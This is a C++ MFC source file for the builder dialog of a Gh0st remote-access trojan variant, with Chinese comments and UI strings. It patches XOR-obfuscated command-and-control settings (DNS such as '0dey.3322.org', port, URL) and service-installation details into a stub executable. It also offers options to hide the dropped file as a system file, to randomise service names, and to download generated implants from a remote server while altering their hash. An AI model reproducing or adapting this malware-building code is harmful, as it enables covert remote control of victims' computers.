// BuildDialog.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildDialog.h"
#include <wininet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBuildDialog dialog



static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CGh0stApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}


WORD CBuildDialog::ShowPosting=1;

CBuildDialog *m_Point = NULL;

CBuildDialog::CBuildDialog(CWnd* pParent /*=NULL*/)
	: CDialog(CBuildDialog::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuildDialog)
	m_ServerName = _T("Please Input Service Name");
	m_ServerDisplay = _T("Please Input Service Display");
	m_ServerDescribe = _T("Please Input Service Describe");
	m_FileName = _T("FileName");
	m_Dns = _T("127.0.0.1");
	m_CheckUrl = FALSE;
	m_UrlAddress = _T("http://www.baidu.com/ip.txt");
	m_Port = 8080;
	m_ShowTips = _T("");
	m_OnlineMark = _T("");
	//}}AFX_DATA_INIT
	m_Point = this;
}


void CBuildDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildDialog)
	DDX_Control(pDX, IDC_FILESUFFIEX, m_FileSuffiex);
	DDX_Control(pDX, IDC_DIRECTORY, m_Directory);
	DDX_Control(pDX, IDC_FILEATTRIBUTE, m_FileAttribute);
	DDX_Control(pDX, IDC_PROGRESS1, m_Showing);
	DDX_Text(pDX, IDC_SERVERNAME, m_ServerName);
	DDV_MaxChars(pDX, m_ServerName, 128);
	DDX_Text(pDX, IDC_SERVERDISPLAY, m_ServerDisplay);
	DDV_MaxChars(pDX, m_ServerDisplay, 200);
	DDX_Text(pDX, IDC_SERVERDESCRIPT, m_ServerDescribe);
	DDV_MaxChars(pDX, m_ServerDescribe, 300);
	DDX_Text(pDX, IDC_FILENAME, m_FileName);
	DDV_MaxChars(pDX, m_FileName, 20);
	DDX_Text(pDX, IDC_DNS, m_Dns);
	DDV_MaxChars(pDX, m_Dns, 200);
	DDX_Check(pDX, IDC_CHECK_URL, m_CheckUrl);
	DDX_Text(pDX, IDC_URLADDR, m_UrlAddress);
	DDV_MaxChars(pDX, m_UrlAddress, 300);
	DDX_Text(pDX, IDC_PORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Text(pDX, IDC_SHOWTIPS, m_ShowTips);
	DDX_Text(pDX, IDC_ONLINE_MARK, m_OnlineMark);
	DDV_MaxChars(pDX, m_OnlineMark, 100);
	//}}AFX_DATA_MAP

	szIniPath = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetIniFileName();

}


BEGIN_MESSAGE_MAP(CBuildDialog, CDialog)
	//{{AFX_MSG_MAP(CBuildDialog)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_TEST, OnTest)
	ON_BN_CLICKED(IDC_CHECK_URL, OnCheckUrl)
	ON_WM_TIMER()
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildDialog message handlers

int memfind(const char *mem, const char *str, int sizem, int sizes)  
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

VOID MyEncryptFunctionForServer(LPSTR szData,WORD Size)
{
	//该数组用来异或
	WORD AddTable[]={
		3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i]^=AddTable[iCount];
		
		//BUG  忘记iCount++ 导致异或的是数组表 3..
		iCount++;
	}
}

VOID CheckOnlienInfo(ONLINEINFO *lpOnlineInfo)
{
	DWORD Sum = 0;
	
	for (int i=0;i<strlen(lpOnlineInfo->DNS);i++)
		Sum+=lpOnlineInfo->DNS[i];
	
	for (i=0;i<strlen(lpOnlineInfo->URL);i++)
		Sum+=lpOnlineInfo->URL[i];
	
	for (i=0;i<strlen(lpOnlineInfo->szMark);i++)
		Sum+=lpOnlineInfo->szMark[i];
	
	Sum=Sum+lpOnlineInfo->Port+lpOnlineInfo->Type;
	
	lpOnlineInfo->DNS[295]=Sum/10000;
	lpOnlineInfo->DNS[296]=(Sum%10000)/1000;
	lpOnlineInfo->DNS[297]=(Sum%1000)/100;
	lpOnlineInfo->DNS[298]=(Sum%100)/10;
	lpOnlineInfo->DNS[299]=Sum%10;
}

BOOL CBuildDialog::CreateServer(SERVERINFO *lpData,ONLINEINFO *lpOnline,LPSTR szPath)
{
	//DWORD iRand = rand()+GetTickCount()+(DWORD)time(NULL);
	
	//sprintf(szPath,"%s\\%d.exe",ServerPath,iRand);
	
	CopyFile(CGh0stApp::szCurPath,szPath,FALSE);
	
	HANDLE m_Handle =CreateFile(szPath,GENERIC_WRITE|GENERIC_READ,FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle!=INVALID_HANDLE_VALUE)
	{
		SetShowTips("找到DAT文件 开始创建服务端");

		DWORD Size = GetFileSize(m_Handle,NULL);
		char * Buffer = new char[Size];
		if(Buffer == NULL)
		{
			CloseHandle(m_Handle);
			return FALSE;
		}
		DWORD YtesRead=0;
		DWORD iCount=0;
		do
		{
			ReadFile(m_Handle,&Buffer[iCount],Size-iCount,&YtesRead,NULL);
			iCount+=YtesRead;
		}while(iCount<Size);
		
		DWORD SizePoint = memfind(Buffer,"YYYYYYYYYYYYY",Size,0);//DDDDDDDDDDDDD
		                                  
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			MyEncryptFunctionForServer((LPSTR)lpData,sizeof(SERVERINFO));
			WriteFile(m_Handle,lpData,sizeof(SERVERINFO),&Written,NULL);
			SetShowTips("写入释放参数成功!");
		}
		SizePoint = memfind(Buffer,"127.0.0.1",Size,0);
		if(SizePoint != 0)
		{
			SetFilePointer(m_Handle,SizePoint,0,FILE_BEGIN);
			DWORD Written=0;
			CheckOnlienInfo(lpOnline);
			MyEncryptFunctionForServer((LPSTR)lpOnline,sizeof(ONLINEINFO));
			WriteFile(m_Handle,lpOnline,sizeof(ONLINEINFO),&Written,NULL);
			SetShowTips("写入上线信息成功!");
		}
		CloseHandle(m_Handle);
		SetShowTips("生成完毕 祝您使用愉快.");
	}
	
	return TRUE;
}

static CString SavePath;

void CBuildDialog::OnBuild() 
{
	// TODO: Add your control notification handler code here
	m_Showing.SetPos(1);

	//严格控制数据的准确性
	UpdateData(TRUE);
	m_Showing.SetPos(1);
	if(m_CheckUrl)
	{
		if(m_UrlAddress.IsEmpty())
		{
			MessageBox("URL 地址不能为空!");
			return;
		}
	}
	else if(m_Dns.IsEmpty())
	{
		MessageBox("DNS 不能为空!");
		return;
	}
	
	if(m_ServerName.IsEmpty())
	{
		MessageBox("服务名不能为空!");
		return;
	}
	if(m_ServerDisplay.IsEmpty())
	{
		MessageBox("服务显示不能为空!");
		return;
	}
	if(m_ServerDescribe.IsEmpty())
	{
		MessageBox("服务描述不能为空!");
		return;
	}
	ZeroMemory(&m_ServiceInfo,sizeof(SERVERINFO));
	ZeroMemory(&m_OnlineInfo,sizeof(ONLINEINFO));

	strcpy(m_OnlineInfo.DNS,m_Dns.GetBuffer(0));
	strcpy(m_OnlineInfo.URL,m_UrlAddress.GetBuffer(0));
	m_OnlineInfo.Port =(WORD)m_Port;
	m_OnlineInfo.Type = m_CheckUrl;
	strcpy(m_OnlineInfo.szMark,m_OnlineMark.GetBuffer(0));

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","DNS",m_OnlineInfo.DNS);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","URL",m_OnlineInfo.URL);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("配置","Port",m_OnlineInfo.Port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("配置","Type",m_CheckUrl);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","Mark",m_OnlineMark);

	
	strcpy(m_ServiceInfo.ServiceName,m_ServerName.GetBuffer(0));
	strcpy(m_ServiceInfo.ServiceShow,m_ServerDisplay.GetBuffer(0));
	strcpy(m_ServiceInfo.ServiceDescribe,m_ServerDescribe.GetBuffer(0));
	
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","ServiceName",m_ServiceInfo.ServiceName);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","ServiceDisplay",m_ServiceInfo.ServiceShow);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","ServiceDescribe",m_ServiceInfo.ServiceDescribe);

	GetDlgItemText(IDC_DIRECTORY,m_ServiceInfo.ReleasePath,MAX_PATH);
	

	//判断是否加了
	WORD Tail = strlen(m_ServiceInfo.ReleasePath)-1;

	if(m_ServiceInfo.ReleasePath[Tail]!='\\')
	{
		strcat(m_ServiceInfo.ReleasePath,"\\");
		SetDlgItemText(IDC_DIRECTORY,m_ServiceInfo.ReleasePath);
	}

	//判断是否有多层目录
	CHAR *Judge = strstr(m_ServiceInfo.ReleasePath,"\\");
	if(Judge)
	{
		Judge++;
		CHAR *Judge2= strstr(Judge,"\\");
		if(Judge2)
		{
			Judge2++;
			CHAR *Judge3=strstr(Judge2,"\\");
			if(Judge3)
			{
				MessageBox("目录不合法!大哥..目录太深的了!我表示创建目录很辛苦!");
				return;
			}
		}
	}

	SetShowTips("数据正确性 校验成功.");

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","Directory",m_ServiceInfo.ReleasePath);

	strcat(m_ServiceInfo.ReleasePath,m_FileName.GetBuffer(0));

	CString szTemp;
	GetDlgItemText(IDC_FILESUFFIEX,szTemp);
	strcat(m_ServiceInfo.ReleasePath,szTemp.GetBuffer(0));

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("配置","FileName",m_FileName.GetBuffer(0));

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("配置","FileSuffiex",m_FileSuffiex.GetCurSel());


	GetDlgItemText(IDC_FILEATTRIBUTE,szTemp);

	if(szTemp == "正常")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(szTemp == "隐藏")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_HIDDEN;

	if(szTemp == "系统")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_SYSTEM;

	if(szTemp == "只读")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_READONLY;

	if(szTemp == "隐藏+系统")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;

	if(szTemp == "隐藏+系统+只读")
		m_ServiceInfo.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("配置","FileAttribute",m_FileAttribute.GetCurSel());
	
	CHAR SaveName[15]={NULL};
	ZeroMemory(SaveName,15);
	for (int i=0;i<9;i++)
		SaveName[i]=GetRandChar(FALSE,i);

	SaveName[0]=GetRandChar(TRUE,i);
	strcat(SaveName,"_XHJ");

	SetShowTips("配置信息已经保存.");

	CFileDialog *Point = new CFileDialog(FALSE,"exe",SaveName,OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
		"*.exe(*.可执行文件)||",this);
	if(Point->DoModal()==IDOK)
		SavePath = Point->GetPathName();
	else
	{
		SavePath.Empty();
		delete Point;
		return;
	}
	

	CreateServer(&m_ServiceInfo,&m_OnlineInfo,SavePath.GetBuffer(0));
	
	m_Showing.SetPos(10);

	CString szTempTips;
	szTempTips.Format("生成成功!文件保存在:\r\n%s",SavePath.GetBuffer(0));

	MessageBox(szTempTips,"提示",MB_OK|MB_ICONINFORMATION);

	
	//SetTimer(0x100,300,NULL);

	//CloseHandle(CreateThread(NULL,NULL,WorkingThread,&m_ServiceInfo,NULL,NULL));

	delete Point;
}

BOOL CBuildDialog::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	//m_Directory.SetCurSel(0);
	
	m_FileAttribute.SetCurSel(((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("配置","FileAttribute",0));
	m_FileSuffiex.SetCurSel(((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("配置","FileSuffiex",0));

	m_Showing.SetRange(1,10);
	m_Showing.SetPos(1);

	CString szTemp=((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","Directory","%SystemRoot%\\");
	SetDlgItemText(IDC_DIRECTORY,szTemp);
	
	m_FileName = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","FileName","FileName");

	m_ServerName = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","ServiceName","Please Input Service Name");
	m_ServerDisplay= ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","ServiceDisplay","Please Input Service Display");
	m_ServerDescribe=((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","ServiceDescribe","Please Input Service Describe");
	
	m_Dns = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","DNS","0dey.3322.org");
	m_UrlAddress = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","URL","http://www.baidu.com/ip.txt");
	m_CheckUrl = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("配置","Type",0);
	m_Port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("配置","Port",8000);

	m_OnlineMark = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("配置","Mark","Terminate");

	if(m_CheckUrl)
	{
		GetDlgItem(IDC_DNS)->EnableWindow(FALSE);
		GetDlgItem(IDC_PORT)->EnableWindow(FALSE);
		GetDlgItem(IDC_URLADDR)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_DNS)->EnableWindow(TRUE);
		GetDlgItem(IDC_PORT)->EnableWindow(TRUE);
		GetDlgItem(IDC_URLADDR)->EnableWindow(FALSE);
	}

	UpdateData(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

BOOL CBuildDialog::InitializationOnlineInfo(LPSTR szURL)
{

	CHAR szIP[100]={NULL};
	WORD Port;

	CString szTemp;

	HINTERNET	hNet;
	HINTERNET	hFile;
	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
	
	szTemp.Format("正在打开 %s",szURL);
	SetShowTips(szTemp.GetBuffer(0));
	
	if (hNet == NULL)
	{
		SetShowTips("打开失败!");
		return FALSE;
	}

	
	hFile = InternetOpenUrl(hNet, szURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL)
		return FALSE;
	
	SetShowTips("读取文件中..");

	char	buffer[2048]={NULL};
	DWORD	dwBytesRead = 0;
	
	memset(buffer, 0, sizeof(buffer));
	InternetReadFile(hFile, buffer, sizeof(buffer), &dwBytesRead);
	
	InternetCloseHandle(hFile);
	InternetCloseHandle(hNet);
	
	CHAR *Point = strstr(buffer,":");
	if(Point == NULL)
		return FALSE;
	
	strncpy(szIP,buffer,strlen(buffer)-strlen(Point));
	
	Point++;
	Port = atoi(Point);

	szTemp.Format("读取到的IP: %s\r\n端口:%d",szIP,Port);
	SetShowTips(szTemp.GetBuffer(0));

	return TRUE;
}

void CBuildDialog::OnTest() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	if(m_CheckUrl == FALSE)
	{
		SOCKET m_Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		
		SOCKADDR_IN m_Addr={NULL};
		
		m_Addr.sin_family = AF_INET;
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(m_Dns.GetBuffer(0));
		m_Addr.sin_port = htons((WORD)m_Port);
		
		CBuildDialog::ShowPosting=2;
		
		if(connect(m_Socket,(SOCKADDR *)&m_Addr,sizeof(SOCKADDR))!=SOCKET_ERROR)
		{
			CString szShow;
			szShow.Format("连接: %s 端口:%d 成功!",inet_ntoa(m_Addr.sin_addr),m_Port);

			MessageBox(szShow.GetBuffer(0),"提示",MB_OK|MB_ICONINFORMATION);
		}
		else
			MessageBox("连接失败!","提示",MB_OK|MB_ICONINFORMATION);

		closesocket(m_Socket);
	}
	else
	{
		InitializationOnlineInfo(m_UrlAddress.GetBuffer(0));
	}
}

void CBuildDialog::OnCheckUrl() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	if(m_CheckUrl)
	{
		GetDlgItem(IDC_DNS)->EnableWindow(FALSE);
		GetDlgItem(IDC_PORT)->EnableWindow(FALSE);
		GetDlgItem(IDC_URLADDR)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_DNS)->EnableWindow(TRUE);
		GetDlgItem(IDC_PORT)->EnableWindow(TRUE);
		GetDlgItem(IDC_URLADDR)->EnableWindow(FALSE);
	}
}

DWORD WINAPI MotifySaveFile(LPVOID lParam)
{
	CHAR FileSavePath[MAX_PATH]={NULL};
	ZeroMemory(FileSavePath,MAX_PATH);
	strcpy(FileSavePath,(char *)lParam);
	
	while(TRUE)
	{
		HANDLE m_Write=CreateFile(FileSavePath,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,
			NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	
		if(m_Write!=INVALID_HANDLE_VALUE)
		{
			SetFilePointer(m_Write,-1000,NULL,FILE_END);
			CHAR Buffer[1000]={NULL};
			((CGh0stApp *)AfxGetApp())->GetRandString(Buffer,1000);

			DWORD WriteBytes=0;
			WriteFile(m_Write,Buffer,1000,&WriteBytes,NULL);
			CloseHandle(m_Write);
			Sleep(2000);
		}
		else
			break;
	}

	return 0;
}

//数据头.
static struct REQUSET
{
	WORD Type;        //请求类型
	CHAR Name[100];   //用户名
	CHAR Pass[100];   //密码
	CHAR Permissions[100];//开号人..
}m_Request={0};

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);

DWORD WINAPI CBuildDialog::WorkingThread(LPVOID lParam)
{
	//获取用户名跟密码
	m_Request.Type = 4;
	
	CString szTemp = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings","UserName");

	if(szTemp =="")
	{
		m_Point->SetShowTips("抱歉 你还未登录!");
		return 1;
	}
	strcpy(m_Request.Name,szTemp.GetBuffer(0));
	strcpy(m_Request.Permissions,PERMISSIONS);

	szTemp = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings","PassWord");
	if(szTemp =="")
	{
		m_Point->SetShowTips("抱歉 你还未登录!");
		return 1;
	}
	strcpy(m_Request.Pass,szTemp.GetBuffer(0));
	
	CBuildDialog::ShowPosting=1;

	SERVERINFO m_Data={NULL};
	memcpy(&m_Data,lParam,sizeof(SERVERINFO));

	SOCKET m_Socket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	SOCKADDR_IN m_Addr={NULL};
	
	m_Addr.sin_family = AF_INET;

	CString szDns = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ServerAddress","");
	if(szDns.IsEmpty())
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(OFFICIALADDRESS);
	else
		m_Addr.sin_addr.S_un.S_addr = ResolvDNS(szDns.GetBuffer(0));

	m_Addr.sin_port = htons(SERVERPORT);

	CBuildDialog::ShowPosting=2;

	if(connect(m_Socket,(SOCKADDR *)&m_Addr,sizeof(SOCKADDR))!=SOCKET_ERROR)
	{
		m_Point->SetShowTips("连接服务器成功!");

		CBuildDialog::ShowPosting=5;
		
		SendData(m_Socket,(char *)&m_Request,sizeof(REQUSET));

		SendData(m_Socket,(char *)&m_Data,sizeof(SERVERINFO));

		SendData(m_Socket,(char *)&m_OnlineInfo,sizeof(ONLINEINFO));
		
		m_Point->SetShowTips("配置数据发送完毕!");

		CHAR szRecv[40]={NULL};
		ZeroMemory(szRecv,40);
		RecvData(m_Socket,szRecv,39);
		
		m_Point->SetShowTips(szRecv);
		
		if(strstr(szRecv,"错误"))
		{
			CBuildDialog::ShowPosting=10;
			closesocket(m_Socket);
			return 0;
		}
		Sleep(100);
		m_Point->SetShowTips("DOS Header 通过验证!");

		//接收文件ing.....
		CHAR Buffer[100]={NULL};
		HANDLE m_Handle = CreateFile(SavePath.GetBuffer(0),GENERIC_WRITE,
		FILE_SHARE_WRITE,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

		CBuildDialog::ShowPosting=9;
		m_Point->SetShowTips("开始下载服务端数据!");

		DWORD Writen =0;
		while(RecvData(m_Socket,Buffer,100))
		{
			WriteFile(m_Handle,Buffer,100,&Writen,NULL);
		}
		WriteFile(m_Handle,Buffer,100,&Writen,NULL);

		RandMoniCount++;
		char szTempbuffer[1024];
		for (int i=0;i<1023;i++)
			szTempbuffer[i]=(GetRandChar(FALSE,i)+GetTickCount())%255;

		WriteFile(m_Handle,szTempbuffer,1024,&Writen,NULL);

		CloseHandle(m_Handle);
		CBuildDialog::ShowPosting=10;

		szTemp.Format("下载数据成功! 文件保存在:\r\n%s",SavePath.GetBuffer(0));
		m_Point->SetShowTips(szTemp.GetBuffer(0));
		::MessageBox(NULL,szTemp.GetBuffer(0),"提示",MB_OK|MB_ICONINFORMATION);
		CloseHandle(CreateThread(NULL,NULL,MotifySaveFile,SavePath.GetBuffer(0),NULL,NULL));
		Sleep(100);
	}
	else
		m_Point->SetShowTips("连接服务器失败!");

	CBuildDialog::ShowPosting=10;
	closesocket(m_Socket);
	return 0;
}

void CBuildDialog::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent == 0x100)
	{
		m_Showing.SetPos(ShowPosting);
		if(ShowPosting == 10)
		{
			KillTimer(nIDEvent);
			ShowPosting = 1;
		}
	}
	CDialog::OnTimer(nIDEvent);
}


VOID CBuildDialog::SetShowTips(LPSTR szStr)
{
	m_ShowTips+=szStr;
	m_ShowTips+="\r\n";
	SetDlgItemText(IDC_SHOWTIPS,m_ShowTips);
}




void CBuildDialog::OnRandom() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	RandMoniCount++;
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}


	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}


	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}

	SetDlgItemText(IDC_SERVERNAME,ServerName);
	SetDlgItemText(IDC_SERVERDISPLAY,ServerShow);
	SetDlgItemText(IDC_SERVERDESCRIPT,ServerDesc);


	CHAR szTemp[10]={NULL};
	ZeroMemory(szTemp,10);

	for (i=0;i<4;i++)
		szTemp[i]=GetRandChar(FALSE,i);

	szTemp[0]=GetRandChar(TRUE,++i);
	
	m_Directory.SetCurSel(2);

	CString szShow;
	GetDlgItemText(IDC_DIRECTORY,szShow);

	szShow+=szTemp;

	SetDlgItemText(IDC_DIRECTORY,szShow);

	ZeroMemory(szTemp,10);
	
	for (i=0;i<9;i++)
		szTemp[i]=GetRandChar(FALSE,i);

	szTemp[0]=GetRandChar(TRUE,++i);

	SetDlgItemText(IDC_FILENAME,szTemp);
	
	szTemp[0]%=4;
	m_FileSuffiex.SetCurSel(szTemp[0]);

	szTemp[1]%=5;
	m_FileAttribute.SetCurSel(szTemp[1]);

	UpdateData(TRUE);
}	
